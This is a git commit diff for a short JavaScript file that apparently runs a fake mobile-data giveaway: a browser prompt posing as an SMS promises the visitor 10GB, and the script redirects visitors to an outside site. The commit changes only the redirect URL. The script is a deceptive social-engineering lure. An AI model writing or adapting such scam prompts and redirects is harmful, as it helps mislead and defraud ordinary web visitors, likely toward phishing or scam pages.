ee72c4af744df410fc907f18d427cc3c4a7f1e2d
mfednewblog9 <newekpeitid@gmail.com>
2026-01-20 20:35:11 +0100

    Update birthday-activation.js

--- birthday-activation.js
+++ birthday-activation.js
@@ -1,5 +1,5 @@
 var password = 'ACTIVER 10GB'
 password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB, click OK to Enter Your ACTIVER 10GB','ACTIVER 10GB');
 if (password != 'ACTIVER 10GB') {
-location.href='https://igbim.org/birthday-10gb';
+location.href='https://igbim.org/birthday.html';
 }
